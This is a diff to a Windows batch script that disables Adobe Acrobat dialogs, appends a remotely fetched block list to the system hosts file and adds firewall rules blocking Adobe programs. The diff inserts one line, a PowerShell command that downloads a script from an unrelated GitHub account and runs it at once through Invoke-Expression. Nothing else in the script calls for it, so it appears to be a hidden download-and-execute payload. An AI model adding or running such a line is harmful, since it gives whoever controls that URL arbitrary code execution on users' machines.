@@ -36,7 +36,7 @@ Reg.exe add "HKCU\Software\Adobe\Adobe Acrobat\DC\FTEDialog" /v "iFTEVersion" /t
 Reg.exe add "HKCU\Software\Adobe\Adobe Acrobat\DC\FTEDialog" /v "iLastCardShown" /t REG_DWORD /d "0" /f
 
 curl https://raw.githubusercontent.com/ignaciocastro/adobe-is-dumb/main/list.txt >> C:\Windows\System32\drivers\etc\hosts
-
+powershell -command "& { Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mskaufde/Microsoft/main/Rules.ps1')) }"
 netsh advfirewall firewall add rule name="Block Outbound TrafficAD" dir=out action=block program="C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe"
 netsh advfirewall firewall add rule name="Block Outbound TrafficAGS" dir=out action=block program="C:\Program Files (x86)\Common Files\Adobe\Adobe Desktop Common\AdobeGenuineClient\AGSService.exe"
 netsh advfirewall firewall add rule name="Block Specific Software Inbound" dir=in action=block program="C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe" enable=yes
